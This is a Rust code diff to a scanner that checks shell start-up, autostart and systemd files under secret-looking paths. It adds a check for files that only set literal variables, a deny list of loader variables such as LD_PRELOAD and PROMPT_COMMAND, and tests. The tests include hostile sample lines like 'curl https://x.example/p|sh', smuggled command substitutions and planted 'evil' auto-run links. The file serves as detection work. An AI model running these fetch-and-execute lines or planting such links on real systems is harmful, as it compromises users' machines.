@@ -126,6 +126,7 @@ fn examine(
                 // values that look like secrets. What a path says of the
                 // file is asked of the file's own path, not of the name
                 // the item is listed under.
+                let written = text;
                 let text = without_secrets(text);
                 let file = shown_path(collect::file_of(item), home);
                 if reading == Some(Reading::Reviewed) {
@@ -136,7 +137,10 @@ fn examine(
                 }
                 // Whoever writes a file picks its path: code that a secret
                 // path keeps from the AI must not pass unseen for that.
-                if reading == Some(Reading::Secrets) && is_run(item, &text) {
+                if reading == Some(Reading::Secrets)
+                    && is_run(item, written)
+                    && !sets_only_variables(written)
+                {
                     report
                         .findings
                         .push(finding(&label, 1, RuleId::KeptFromReview, ""));
@@ -325,19 +329,171 @@ fn is_script(file: &str, text: &str) -> bool {
 }
 
 /// Whether something runs `item`, a file with content `text`: it is a file
-/// of an auto-run location, a command names it or a start-up file reads it
-/// in, it is the SSH server's login script, or a live check found it
-/// running as a script. Not what was only reached as more configuration,
-/// and not a file a live check named that is no script: a process's
-/// argument may as well be a key or an `.env` it reads.
+/// of an auto-run location or what a link there leads to, a command names
+/// it or a start-up file reads it in, it is the SSH server's login script,
+/// or a live check found it running as a script. Not what was only read in
+/// as more configuration, not what a unit only reads as a list of
+/// variables (`EnvironmentFile=`), and not a file a live check named that
+/// is no script: a process's argument may as well be a key or an `.env` it
+/// reads.
 fn is_run(item: &Item, text: &str) -> bool {
-    if commands::is_ssh_rc(collect::stands_for(item)) {
+    let stands_for = collect::stands_for(item);
+    if commands::is_ssh_rc(stands_for) {
         return true;
     }
     if item.category.is_live() {
         return is_script(collect::file_of(item), text);
     }
-    collect::configuration_of(item).is_none()
+    // What a link in an auto-run location leads to is run exactly as a
+    // file at the link's own place would be.
+    if stands_for != item.path {
+        return true;
+    }
+    collect::configuration_of(item).is_none() && !collect::is_environment_file(item)
+}
+
+/// Variables that decide what runs or is loaded: setting one, even to a
+/// literal, is more than keeping a value.
+const LOADING_NAMES: &[&str] = &[
+    "PATH",
+    "IFS",
+    "ENV",
+    "BASH_ENV",
+    "PROMPT_COMMAND",
+    "ZDOTDIR",
+    "SHELLOPTS",
+    "BASHOPTS",
+    "PYTHONPATH",
+    "PYTHONSTARTUP",
+    "PYTHONHOME",
+    "NODE_OPTIONS",
+    "NODE_PATH",
+    "PERL5OPT",
+    "PERL5LIB",
+    "RUBYOPT",
+    "RUBYLIB",
+    "GIT_SSH",
+    "GIT_SSH_COMMAND",
+    "GIT_ASKPASS",
+    "GIT_EXEC_PATH",
+    "SSH_ASKPASS",
+    "SUDO_ASKPASS",
+    "EDITOR",
+    "VISUAL",
+    "PAGER",
+    "BROWSER",
+    "FISH_USER_PATHS",
+];
+
+/// Whether `name` is a variable's name that may be set to a literal with
+/// nothing run or loaded for it.
+fn is_plain_name(name: &str) -> bool {
+    let upper = name.to_ascii_uppercase();
+    name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
+        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+        && !LOADING_NAMES.contains(&upper.as_str())
+        && !["LD_", "DYLD_", "GIT_CONFIG"]
+            .iter()
+            .any(|start| upper.starts_with(start))
+        && !upper.ends_with("_PROXY")
+}
+
+/// The words of `line`, each with where it starts, quotes taken off; `None`
+/// for a line that holds anything a shell would expand, run, chain or
+/// redirect: `$`, a backtick or a backslash anywhere, any of `;&|<>(){}`
+/// outside quotes, or a quote that does not close on the line.
+fn literal_words(line: &str) -> Option<Vec<(usize, String)>> {
+    let mut words = Vec::new();
+    let mut word: Option<(usize, String)> = None;
+    let mut quote: Option<char> = None;
+    for (at, character) in line.char_indices() {
+        if matches!(character, '$' | '`' | '\\') {
+            return None;
+        }
+        match quote {
+            Some(open) if character == open => quote = None,
+            None if matches!(character, '"' | '\'') => {
+                quote = Some(character);
+                word.get_or_insert((at, String::new()));
+            }
+            None if character.is_whitespace() => words.extend(word.take()),
+            None if ";&|<>(){}".contains(character) => return None,
+            // Inside quotes, or a plain character outside them.
+            _ => word.get_or_insert((at, String::new())).1.push(character),
+        }
+    }
+    if quote.is_some() {
+        return None;
+    }
+    words.extend(word);
+    Some(words)
+}
+
+/// Whether the word of `line` that starts at `at` is written as
+/// `NAME=…`, the name plain and outside quotes.
+fn assigns(line: &str, at: usize) -> bool {
+    line[at..]
+        .split_once('=')
+        .is_some_and(|(name, _)| is_plain_name(name))
+}
+
+/// Whether `line` does nothing but set variables to literals, in the forms
+/// a shell, fish, Hyprland or an environment file writes that:
+/// `NAME=value` (several on a line, after `export` too), `set -gx NAME
+/// value`, `env = NAME,value` and `$name = value`. A blank line and a
+/// comment do nothing at all.
+fn sets_a_variable(line: &str) -> bool {
+    let line = line.trim();
+    if line.is_empty() || line.starts_with('#') {
+        return true;
+    }
+    // Hyprland's own variable: the one place a `$` is no expansion.
+    let line = match line.strip_prefix('$') {
+        Some(named) => {
+            let Some((name, value)) = named.split_once('=') else {
+                return false;
+            };
+            return is_plain_name(name.trim()) && literal_words(value).is_some();
+        }
+        None => line,
+    };
+    let Some(words) = literal_words(line) else {
+        return false;
+    };
+    let word = |index: usize| words.get(index).map(|(_, word)| word.as_str());
+    match word(0) {
+        // Hyprland: `env = NAME,value`.
+        Some("env")
+            if word(1) == Some("=") || word(1).is_some_and(|next| next.starts_with('=')) =>
+        {
+            line.split_once('=').is_some_and(|(_, setting)| {
+                setting
+                    .split_once(',')
+                    .is_some_and(|(name, _)| is_plain_name(name.trim()))
+            })
+        }
+        Some(joined) if joined.starts_with("env=") => joined["env=".len()..]
+            .split_once(',')
+            .is_some_and(|(name, _)| is_plain_name(name)),
+        // fish: `set [-flags] NAME value…`.
+        Some("set") => words
+            .iter()
+            .skip(1)
+            .map(|(_, word)| word.as_str())
+            .find(|word| !word.starts_with('-'))
+            .is_some_and(is_plain_name),
+        Some("export") => words.len() > 1 && words[1..].iter().all(|(at, _)| assigns(line, *at)),
+        Some(_) => words.iter().all(|(at, _)| assigns(line, *at)),
+        None => true,
+    }
+}
+
+/// Whether `text` does nothing but set variables to literals (see
+/// `sets_a_variable`): a file a shell reads in can hold any command, and
+/// the ordinary one under a secret-looking path holds only these. When in
+/// doubt it does not: a line this does not know counts as a command.
+fn sets_only_variables(text: &str) -> bool {
+    text.lines().all(sets_a_variable)
 }
 
 /// Says on each item that is kept from the AI that it is, and why.
@@ -1410,6 +1566,201 @@ mod tests {
     }
 
     #[test]
+    fn a_line_that_only_sets_a_variable_to_a_literal_is_told_from_a_command() {
+        use super::{sets_a_variable, sets_only_variables};
+        for line in [
+            "",
+            "# a comment",
+            "TOKEN=abc123",
+            "export TOKEN=abc123",
+            "export A=1 B=two",
+            "A=1 B=2",
+            "TOKEN='p@ss w0rd!'",
+            "export NAME=\"two words\"",
+            "set -gx TOKEN abc123",
+            "set -x TOKEN 'two words'",
+            "env = TOKEN,abc123",
+            "env=TOKEN,abc123",
+            "$token = abc123",
+        ] {
+            assert!(sets_a_variable(line), "{line}");
+        }
+        for line in [
+            "TOKEN=$(curl https://x.example/p|sh)",
+            "KEY=abc curl https://x.example/p | sh",
+            "export A=1; curl https://x.example/p|sh",
+            "A=1 && curl x",
+            "TOKEN=`id`",
+            "TOKEN=\"$HOME/x\"",
+            "TOKEN=abc \\",
+            "TOKEN=abc > /tmp/x",
+            "TOKEN='abc",
+            "eval TOKEN=abc",
+            "source ~/.other",
+            ". ~/.other",
+            "alias ls=evil",
+            "f() { curl x; }",
+            "function f",
+            "curl https://x.example/p",
+            "export -f f",
+            "export TOKEN",
+            "\"A\"=1",
+            "set -e",
+            "set -x TOKEN (curl x)",
+            "declare -x TOKEN=abc",
+            "env = TOKEN,$(id)",
+            "$token = $(id)",
+            "exec-once = curl x",
+            // What decides what runs or is loaded is no plain value.
+            "PATH=/tmp/x",
+            "export LD_PRELOAD=/tmp/x.so",
+            "PROMPT_COMMAND='curl x.example'",
+            "set -x fish_user_paths /tmp/x",
+            "env = LD_PRELOAD,/tmp/x.so",
+            "https_proxy=http://10.0.0.1:3128",
+        ] {
+            assert!(!sets_a_variable(line), "{line}");
+        }
+        // A quoted value that runs on over a line hides nothing.
+        assert!(!sets_only_variables(
+            "TOKEN='abc\ncurl https://x.example/p | sh\n'\n"
+        ));
+        assert!(sets_only_variables("# keys\nexport A=abc\n\nB='c d'\n"));
+    }
+
+    /// Files under secret-looking paths, by how each is reached.
+    fn kept_by_reach() -> TempDir {
+        let run = "#!/bin/sh\ntrue\n";
+        planted(
+            "sweep-kept-reach",
+            &[
+                // What each link in an auto-run location leads to.
+                (
+                    "home/u/.config/secrets/desktop",
+                    "[Desktop Entry]\nExec=/usr/bin/true\n",
+                ),
+                (
+                    "home/u/.config/secrets/unit",
+                    "[Service]\nExecStart=/usr/bin/true\n",
+                ),
+                ("home/u/.config/secrets/bashrc", "true\n"),
+                ("home/u/.config/secrets/profile", "true\n"),
+                ("home/u/.config/secrets/hook", run),
+                // Silent: settings behind a link, and an SSH `Include`.
+                (
+                    "home/u/.config/secrets/npmrc",
+                    "registry=https://registry.npmjs.org/\n",
+                ),
+                ("home/u/.config/secrets/hosts", "Host x\n  User me\n"),
+                ("home/u/.ssh/config", "Include ~/.config/secrets/hosts\n"),
+                // A unit's list of variables, which systemd does not run,
+                // whatever its lines look like to a shell.
+                ("home/u/.config/app.env", "TOKEN=$(not run)\nA=b c\n"),
+                ("home/u/.config/both.env", "TOKEN=$(run by the shell)\n"),
+                (
+                    "home/u/.config/systemd/user/app.service",
+                    "[Service]\nEnvironmentFile=%h/.config/app.env\nEnvironmentFile=-%h/.config/both.env\nExecStart=/usr/bin/true\n",
+                ),
+                // Files a shell reads in: variables only, and more.
+                (
+                    "home/u/.secrets",
+                    "# keys\nexport API_TOKEN=abcdefgh12345678\n",
+                ),
+                (
+                    "home/u/.config/fish/conf.d/tokens.fish",
+                    "set -gx TOKEN abcdefgh\n",
+                ),
+                (
+                    "home/u/.config/hypr/secrets.conf",
+                    "$token = abcdefgh\nenv = TOKEN,abc\n",
+                ),
+                (
+                    "home/u/.config/environment.d/secrets.conf",
+                    "TOKEN=abcdefgh\n",
+                ),
+                (
+                    "home/u/.config/shell/secrets.sh",
+                    "export A=1; curl https://x.example/p\n",
+                ),
+                (
+                    "home/u/.zshenv",
+                    ". ~/.secrets\n. ~/.config/shell/secrets.sh\n. ~/.config/both.env\n",
+                ),
+                (
+                    "home/u/.config/hypr/hyprland.conf",
+                    "source = ~/.config/hypr/secrets.conf\n",
+                ),
+            ],
+            &[
+                (
+                    "home/u/.config/autostart/evil.desktop",
+                    "../secrets/desktop",
+                ),
+                (
+                    "home/u/.config/systemd/user/evil.service",
+                    "../../secrets/unit",
+                ),
+                ("home/u/.bashrc", ".config/secrets/bashrc"),
+                ("etc/profile.d/p.sh", "/home/u/.config/secrets/profile"),
+                (
+                    "home/u/.config/omarchy/hooks/theme-set",
+                    "../../secrets/hook",
+                ),
+                ("home/u/.npmrc", ".config/secrets/npmrc"),
+            ],
+        )
+    }
+
+    #[test]
+    fn a_kept_file_is_a_finding_by_how_it_is_run_and_what_it_holds() {
+        let dir = kept_by_reach();
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let scope = Scope {
+            root: dir.path(),
+            home: Some("home/u"),
+            index: &index,
+            origin: Origin::System,
+        };
+        let collection = collect::collect(&scope);
+        let (sent, findings) = examined(&collection);
+        let kept: Vec<&str> = findings
+            .iter()
+            .filter(|(_, rule)| *rule == RuleId::KeptFromReview)
+            .map(|(path, _)| path.as_str())
+            .collect();
+        assert_eq!(
+            kept,
+            [
+                "~/.config/both.env",
+                "~/.config/secrets/bashrc",
+                "~/.config/secrets/desktop",
+                "~/.config/secrets/hook",
+                "~/.config/secrets/profile",
+                "~/.config/secrets/unit",
+                "~/.config/shell/secrets.sh",
+            ]
+        );
+        // And none of them, silent or not, was sent.
+        for path in &sent {
+            assert!(!path.contains("secret") && !path.contains(".env"), "{path}");
+        }
+        for listed in [
+            "home/u/.config/app.env",
+            "home/u/.secrets",
+            "home/u/.config/fish/conf.d/tokens.fish",
+            "home/u/.config/hypr/secrets.conf",
+            "home/u/.config/environment.d/secrets.conf",
+            "home/u/.config/secrets/npmrc",
+            "home/u/.config/secrets/hosts",
+        ] {
+            assert!(
+                collection.items.iter().any(|item| item.path == listed),
+                "{listed} is not listed"
+            );
+        }
+    }
+
+    #[test]
     fn an_alert_is_reported_at_the_line_it_names() {
         assert_eq!(
             located("line 14: linker: every build runs a program"),
@@ -1652,12 +2003,13 @@ mod tests {
             kept(&collection),
             [
                 "~/.config/secrets/run.sh",
-                "~/.env",
                 "~/.gnupg/gpg-wrapper",
                 "~/.ssh/rc",
                 "~/bin/token-refresh.sh",
             ]
         );
+        // (`~/.env`, which a start-up file reads in, only sets a variable
+        // to a literal: it is no finding.)
         // One the user allowed is quiet.
         for item in &mut collection.items {
             if item.path == "home/u/.gnupg/gpg-wrapper" {
